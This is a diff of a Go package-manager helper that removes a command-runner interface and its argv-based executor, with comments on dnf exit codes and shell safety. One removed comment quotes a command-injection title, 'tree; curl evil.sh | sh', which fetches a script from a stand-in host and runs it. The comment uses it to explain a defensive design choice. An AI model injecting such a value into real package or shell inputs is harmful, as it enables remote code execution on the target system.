@@ -1,7 +1,6 @@
 package ral
 
 import (
-	"context"
 	"regexp"
 	"strings"
 )
@@ -15,43 +14,6 @@ import (
 // twice reports previous_value="6.12.0-1; 6.12.0-2" verbatim. Changing the
 // separator changes a reported value, and diverges from Ruby on the leaf.
 const multiVersionSeparator = "; "
-
-// commandRunner runs one command and reports its exit status, its combined
-// output, and whether the command could be run at all.
-//
-// A NON-ZERO EXIT IS A VALUE, NOT AN ERROR. Only a failure to start or to wait
-// is an error. This is not a stylistic echo of Exec.execute: `dnf check-update`
-// uses exit 100 to mean "updates are available" and exit 0 to mean "none are",
-// so a runner that folded non-zero into err would turn the single most
-// informative answer dnf gives into a failure.
-//
-// It is an interface so the policy above it can be tested without a package
-// manager present -- which is the whole reason this seam is separate from the
-// provider.
-type commandRunner interface {
-	run(ctx context.Context, name string, args ...string) (exitCode int, output string, err error)
-}
-
-// execRunner is the commandRunner that actually executes commands.
-type execRunner struct{}
-
-// run implements commandRunner.
-//
-// NO SHELL. Unlike Exec.execute, which must use `/bin/sh -c` because Puppet's
-// exec semantics are defined in terms of a shell, this passes argv directly to
-// exec.CommandContext. That is a SECURITY PROPERTY, not a style preference:
-// package names arrive from a catalog, so a shell here would make `ensure =>
-// present` on a crafted title such as `tree; curl evil.sh | sh` a command
-// injection. In argv form a crafted name is one argument that dnf rejects.
-//
-// No process group is set up, again unlike Exec.execute: there is no shell to
-// outlive, so CommandContext's kill reaches the command itself.
-//
-// Output goes to a temporary file capped at maxCommandOutput, with the D-80
-// warning when cut (runCapped); the exit-code and error contract is unchanged.
-func (execRunner) run(ctx context.Context, name string, args ...string) (int, string, error) {
-	return runArgv(ctx, name, args...)
-}
 
 // nevraLine is rpm.rb:28's NEVRA_REGEX. Its fields are name, epoch, version,
 // release and arch, separated by exactly one space; a leading quote is
